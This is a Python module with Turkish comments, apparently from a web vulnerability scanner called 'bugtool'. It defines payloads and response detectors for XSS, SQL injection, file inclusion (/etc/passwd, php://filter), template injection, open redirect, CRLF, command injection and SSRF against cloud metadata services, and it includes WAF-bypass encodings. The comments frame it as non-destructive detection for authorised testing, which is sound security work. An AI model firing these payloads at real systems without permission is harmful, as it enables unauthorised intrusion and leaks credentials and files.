"""bugtool payload arsenali — TEK KAYNAK (single source of truth).

Felsefe: **detection-oriented (non-destructive)**. Amaç bir zafiyeti *kanıtlamak*, hedefe
zarar vermek değil. Bu yüzden:
  - SQLi   → hata imzası + zaman-tabanlı `SLEEP` (DROP/DELETE YOK)
  - LFI    → `/etc/passwd` / `win.ini` okuma marker'ı (dosya silme/yazma YOK)
  - SSTI   → aritmetik değerlendirme (71*79=5609) (kod çalıştırma YOK)
  - XSS    → benzersiz marker'lı yansıma tespiti (gerçek payload patlatma YOK)
  - redirect → kontrollü sahte host'a yönlendirme tespiti
  - CRLF   → response header enjeksiyonu tespiti
  - CMDi   → zaman-tabanlı `sleep` (yıkıcı komut YOK)
  - SSRF   → yalnızca yüksek-sinyal iç-servis imzası (AWS metadata) — gerisi manuel/OOB

Her sınıf: `hints` (param adı ipuçları), `payloads` (encode/WAF-bypass varyantlı),
`detect(ctx, meta)` (kanıt string'i veya None). Encode varyantları kasıtlı — WAF/filtre
atlatma için (kullanıcı isteği: "encodelu falan").

`{M}` = fuzzer'ın runtime'da ürettiği benzersiz marker ile değiştirilir.

ctx sözlüğü (fuzzer.py'den gelir): body, headers (lower key), status, elapsed,
baseline_elapsed, baseline_body, marker — `baseline_body`/`baseline_elapsed` payload'sız
ilk isteğin sonucu, detector'lar yanlış-pozitifi azaltmak için bunlarla kıyaslayabilir.
"""

import random
import re
import string
from typing import Any, Dict, List, Optional


def make_marker() -> str:
    """Yansıma tespiti için benzersiz, zararsız marker (ör. 'bgtl9f3a2c')."""
    return "bgtl" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))


# ── Sabitler (detektörlerle payload'lar arasında paylaşılan) ──────────────────
SSTI_A, SSTI_B = 71, 79
SSTI_RESULT = str(SSTI_A * SSTI_B)          # "5609" — sayfada tesadüfen bulunması zor
REDIRECT_HOST = "bgtl-redirect.example"     # kontrollü, var olmayan hedef host
SLEEP_SECONDS = 6                           # zaman-tabanlı payload gecikmesi
SLEEP_THRESHOLD = 5.0                       # bu kadar fazla gecikme = pozitif aday

# ── SQL hata imzaları (error-based SQLi) ─────────────────────────────────────
_SQL_ERROR_RE = [re.compile(p, re.I) for p in [
    r"SQL syntax.*MySQL", r"warning.*mysqli?", r"MySqlException", r"valid MySQL result",
    r"PostgreSQL.*ERROR", r"pg_query\(\)", r"PG::SyntaxError", r"psql:.*ERROR",
    r"ORA-\d{5}", r"Oracle.*(Driver|error)", r"quoted string not properly terminated",
    r"Microsoft SQL (Server|Native)", r"ODBC SQL Server Driver", r"Unclosed quotation mark",
    r"SQLServerException", r"SQLite/JDBCDriver", r"sqlite3?\.(Operational|Programming)Error",
    r"SQLITE_ERROR", r"syntax error at or near",
]]

# ── /etc/passwd & win.ini imzaları (LFI) ─────────────────────────────────────
_LFI_UNIX_RE = re.compile(r"root:.*?:0:0:", re.I)
_LFI_WIN_RE = re.compile(r"\[(fonts|extensions|mci extensions)\]", re.I)
_LFI_PHPFILTER_RE = re.compile(r"PD9waHA|PD9wbnA")   # base64("<?php" / "<?pn")


# ═══════════════════════════════════════════════════════════════════════════
# DETEKTÖRLER  — detect(ctx, meta) -> kanıt(str) | None
#   ctx: {body, headers(lower key), status, elapsed, baseline_elapsed, baseline_body, marker}
#   meta: payload sözlüğü (aşağıdaki payload listelerinden)
# ═══════════════════════════════════════════════════════════════════════════
def _detect_xss(ctx: Dict[str, Any], meta: Dict[str, str]) -> Optional[str]:
    body = ctx["body"]
    marker = ctx["marker"]
    if marker not in body:
        return None
    # KRİTİK: yalnızca HAM `<tag` yansıması sayılır. `onload=`/`onerror=` HTML-encode'dan
    # sağ çıkar (FP kaynağı) — açı parantezinin `&lt;`'e çevrilmediğini görmek şart.
    idx = body.find(marker)
    around = body[max(0, idx - 100): idx + 100]
    for tag in ("<svg", "<script", "<img", "<details", "<iframe", "<body", "<image"):
        if tag in around:
            return f"Payload HAM yansıdı (encode edilmedi): …{around.strip()[:120]}…"
    return None


def _detect_sqli(ctx: Dict[str, Any], meta: Dict[str, str]) -> Optional[str]:
    baseline_body = ctx.get("baseline_body", "") or ""
    for rx in _SQL_ERROR_RE:
        m = rx.search(ctx["body"])
        if not m:
            continue
        # DÜZELTME (önceki incelemede bulundu): baseline (payload'sız istek) ile
        # kıyaslama yapılmıyordu. Genel bir hata/debug sayfası HER istekte (payload'dan
        # bağımsız) görünen bir uygulamada, tek tırnak gönderen her istek "SQLi bulundu"
        # olarak işaretlenebiliyordu. Aynı imza baseline'da da varsa bu payload'ın
        # sebep olduğu bir şey değildir — saymıyoruz, ama zaman-tabanlı kontrolü
        # denemeye devam ediyoruz (aşağıda).
        if baseline_body and rx.search(baseline_body):
            continue
        return f"SQL hata imzası: '{m.group(0)[:80]}'"
    if meta.get("t") == "time" and ctx["elapsed"] >= ctx["baseline_elapsed"] + SLEEP_THRESHOLD:
        return f"Zaman-tabanlı gecikme: {ctx['elapsed']:.1f}s (baseline {ctx['baseline_elapsed']:.1f}s)"
    return None


def _detect_lfi(ctx: Dict[str, Any], meta: Dict[str, str]) -> Optional[str]:
    body = ctx["body"]
    if _LFI_UNIX_RE.search(body):
        return "LFI: /etc/passwd içeriği yansıdı (root:...:0:0:)"
    if _LFI_WIN_RE.search(body):
        return "LFI: Windows win.ini içeriği yansıdı ([fonts]/[extensions])"
    if _LFI_PHPFILTER_RE.search(body):
        return "LFI: php://filter ile base64 kaynak kodu sızıntısı (PD9waHA…)"
    return None


def _detect_ssti(ctx: Dict[str, Any], meta: Dict[str, str]) -> Optional[str]:
    body = ctx["body"]
    raw = meta["p"]
    # Aritmetik DEĞERLENDİRİLDİ mi (sonuç var) ama ham ifade YOK (motor işledi)?
    if SSTI_RESULT in body and raw not in body:
        return f"SSTI: template aritmetiği değerlendirildi ({SSTI_A}*{SSTI_B}={SSTI_RESULT})"
    return None


def _detect_open_redirect(ctx: Dict[str, Any], meta: Dict[str, str]) -> Optional[str]:
    loc = ctx["headers"].get("location", "")
    if not loc:
        # meta-refresh / JS yönlendirme gövdede olabilir
        if REDIRECT_HOST in ctx["body"] and ("http-equiv" in ctx["body"].lower()
                                             or "location" in ctx["body"].lower()):
            return f"Open redirect adayı (gövde yönlendirmesi → {REDIRECT_HOST})"
        return None
    low = loc.lower().lstrip()
    # Location HAM olarak bizim host'a mı gidiyor (protocol-relative dahil)?
    if (low.startswith(f"http://{REDIRECT_HOST}") or low.startswith(f"https://{REDIRECT_HOST}")
            or low.startswith(f"//{REDIRECT_HOST}") or REDIRECT_HOST + "/" in low
            or low.endswith(REDIRECT_HOST)):
        return f"Open redirect: Location → {loc[:120]}"
    return None


def _detect_crlf(ctx: Dict[str, Any], meta: Dict[str, str]) -> Optional[str]:
    marker = ctx["marker"]
    # Enjekte edilen başlık response header'larına düştü mü?
    if marker in ctx["headers"].get("bgtl-test", "") or "bgtl-test" in ctx["headers"]:
        return "CRLF: enjekte edilen 'Bgtl-Test' header response'a yansıdı"
    if "set-cookie" in ctx["headers"] and marker in ctx["headers"].get("set-cookie", ""):
        return "CRLF: enjekte edilen Set-Cookie response'a yansıdı"
    return None


def _detect_cmdi(ctx: Dict[str, Any], meta: Dict[str, str]) -> Optional[str]:
    if meta.get("t") == "time" and ctx["elapsed"] >= ctx["baseline_elapsed"] + SLEEP_THRESHOLD:
        return f"OS komut enjeksiyonu (zaman-tabanlı): {ctx['elapsed']:.1f}s gecikme"
    return None


def _detect_ssrf(ctx: Dict[str, Any], meta: Dict[str, str]) -> Optional[str]:
    body = ctx["body"]
    # Yalnızca YÜKSEK sinyal: bulut metadata cevabı yansıdıysa.
    # DÜZELTME (önceki incelemede bulundu): eski listede "ail=1" adında, hiçbir bilinen
    # metadata formatına karşılık gelmeyen, çok kısa/genel bir imza vardı — "email=1"
    # gibi tamamen alakasız bir string içinde bile eşleşip yanlış pozitif üretebilirdi.
    # Ne olması gerektiğinden emin olunamadığı için kaldırıldı (yanlış bir şeyle
    # değiştirmek yerine).
    for sig in ("ami-id", "instance-id", "iam/security-credentials", "meta-data",
                "computeMetadata"):
        if sig in body:
            return f"SSRF: iç metadata servisi cevabı yansıdı ('{sig}')"
    return None


# ═══════════════════════════════════════════════════════════════════════════
# ARSENAL  — sınıf → {hints, payloads, detect}
#   payload meta: {"p": <template>, "t": <tag: reflect|error|time|marker|probe>}
# ═══════════════════════════════════════════════════════════════════════════
CLASSES: Dict[str, Dict[str, Any]] = {
    "xss": {
        "hints": ["q", "s", "search", "query", "keyword", "kw", "name", "message", "msg",
                  "comment", "title", "text", "ref", "lang", "return", "redirect"],
        "payloads": [
            {"p": '"><svg/onload=alert({M})>', "t": "reflect"},
            {"p": "'><script>alert({M})</script>", "t": "reflect"},
            {"p": '"><img src=x onerror=alert({M})>', "t": "reflect"},
            # WAF-bypass / encode varyantları
            {"p": '"><svg%0aonload=alert({M})>', "t": "reflect"},
            {"p": '"><deTailS/open/ontoggle=alert({M})>', "t": "reflect"},
            {"p": '%22%3E%3Csvg/onload=alert({M})%3E', "t": "reflect"},
        ],
        "detect": _detect_xss,
    },
    "sqli": {
        "hints": ["id", "uid", "user_id", "userid", "pid", "cat", "category", "item",
                  "order", "sort", "product", "num", "no", "page_id", "gid", "aid"],
        "payloads": [
            {"p": "'", "t": "error"},
            {"p": "\"", "t": "error"},
            {"p": "')", "t": "error"},
            {"p": "' OR SLEEP({S})-- -", "t": "time"},
            {"p": "1) OR SLEEP({S})#", "t": "time"},
            {"p": "';SELECT pg_sleep({S})-- -", "t": "time"},
            {"p": "';WAITFOR DELAY '0:0:{S}'-- -", "t": "time"},
        ],
        "detect": _detect_sqli,
    },
    "lfi": {
        "hints": ["file", "filename", "path", "page", "include", "inc", "doc", "document",
                  "folder", "root", "pg", "style", "template", "download", "load", "read", "view"],
        "payloads": [
            {"p": "../../../../../../../../etc/passwd", "t": "marker"},
            {"p": "....//....//....//....//etc/passwd", "t": "marker"},
            {"p": "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "t": "marker"},
            {"p": "%252e%252e%252fetc%252fpasswd", "t": "marker"},   # double-encode
            {"p": "/etc/passwd", "t": "marker"},
            {"p": "..\\..\\..\\..\\..\\windows\\win.ini", "t": "marker"},
            {"p": "php://filter/convert.base64-encode/resource=index.php", "t": "marker"},
        ],
        "detect": _detect_lfi,
    },
    "ssti": {
        "hints": ["template", "preview", "name", "id", "view", "page", "content", "msg",
                  "q", "search", "title"],
        "payloads": [
            {"p": "{{%d*%d}}" % (SSTI_A, SSTI_B), "t": "probe"},        # Jinja2/Twig
            {"p": "${%d*%d}" % (SSTI_A, SSTI_B), "t": "probe"},          # FreeMarker/JSP EL
            {"p": "#{%d*%d}" % (SSTI_A, SSTI_B), "t": "probe"},          # Ruby/Thymeleaf
            {"p": "<%%= %d*%d %%>" % (SSTI_A, SSTI_B), "t": "probe"},    # ERB
            {"p": "{%d*%d}" % (SSTI_A, SSTI_B), "t": "probe"},           # bazı motorlar
            {"p": "${{%d*%d}}" % (SSTI_A, SSTI_B), "t": "probe"},        # polyglot
        ],
        "detect": _detect_ssti,
    },
    "open_redirect": {
        "hints": ["url", "uri", "redirect", "redirect_uri", "redirecturl", "next", "return",
                  "returnurl", "return_url", "continue", "dest", "destination", "target",
                  "out", "to", "goto", "link", "redir", "u", "r", "callback", "image_url"],
        "payloads": [
            {"p": "https://%s/" % REDIRECT_HOST, "t": "redir"},
            {"p": "//%s/" % REDIRECT_HOST, "t": "redir"},               # protocol-relative
            {"p": "https:/%s/" % REDIRECT_HOST, "t": "redir"},          # eksik slash bypass
            {"p": "/\\%s/" % REDIRECT_HOST, "t": "redir"},
            {"p": "https://%s%%2f%%2f" % REDIRECT_HOST, "t": "redir"},
        ],
        "detect": _detect_open_redirect,
    },
    "crlf": {
        "hints": ["url", "redirect", "next", "return", "lang", "page", "goto", "host", "q"],
        "payloads": [
            {"p": "%0d%0aBgtl-Test:{M}", "t": "marker"},
            {"p": "%0aBgtl-Test:{M}", "t": "marker"},
            {"p": "%E5%98%8A%E5%98%8DBgtl-Test:{M}", "t": "marker"},     # unicode CRLF bypass
            {"p": "%0d%0aSet-Cookie:bgtl={M}", "t": "marker"},
        ],
        "detect": _detect_crlf,
    },
    "cmdi": {
        "hints": ["cmd", "exec", "command", "ping", "host", "ip", "dns", "domain", "query",
                  "run", "code", "func", "do", "action", "target"],
        "payloads": [
            {"p": ";sleep {S}", "t": "time"},
            {"p": "|sleep {S}", "t": "time"},
            {"p": "$(sleep {S})", "t": "time"},
            {"p": "`sleep {S}`", "t": "time"},
            {"p": "%0asleep {S}", "t": "time"},
            {"p": "& timeout /t {S}", "t": "time"},                     # Windows
        ],
        "detect": _detect_cmdi,
    },
    "ssrf": {
        "hints": ["url", "uri", "host", "target", "dest", "callback", "webhook", "proxy",
                  "fetch", "load", "image_url", "img", "site", "port", "path", "domain", "feed"],
        "payloads": [
            {"p": "http://169.254.169.254/latest/meta-data/", "t": "probe"},
            {"p": "http://metadata.google.internal/computeMetadata/v1/", "t": "probe"},
            {"p": "http://127.0.0.1:80/", "t": "probe"},
            {"p": "http://[::1]/", "t": "probe"},
        ],
        "detect": _detect_ssrf,
    },
}

ALL_CLASSES: List[str] = list(CLASSES.keys())


def render_payload(template: str, marker: str) -> str:
    """`{M}` (marker) ve `{S}` (sleep saniyesi) yer tutucularını doldurur."""
    return template.replace("{M}", marker).replace("{S}", str(SLEEP_SECONDS))


def hints_for_param(param: str) -> List[str]:
    """Bir parametre adının hangi vuln sınıflarına aday olduğunu döner (isim ipucuyla).

    Eşleşme: tam ad == ipucu, VEYA ipucu bir token (id → user_id), VEYA uzun ipucu (>=4)
    alt-string (redirect → redirect_uri). Kısa ipuçlarının (u/no/id) rastgele alt-string
    eşleşmesi ENGELLENİR (aksi halde her parametre her sınıfa aday olurdu)."""
    p = param.lower()
    tokens = set(t for t in re.split(r"[^a-z0-9]+", p) if t)
    out = []
    for cls, spec in CLASSES.items():
        for h in spec["hints"]:
            if h == p or h in tokens or (len(h) >= 4 and h in p):
                out.append(cls)
                break
    return out
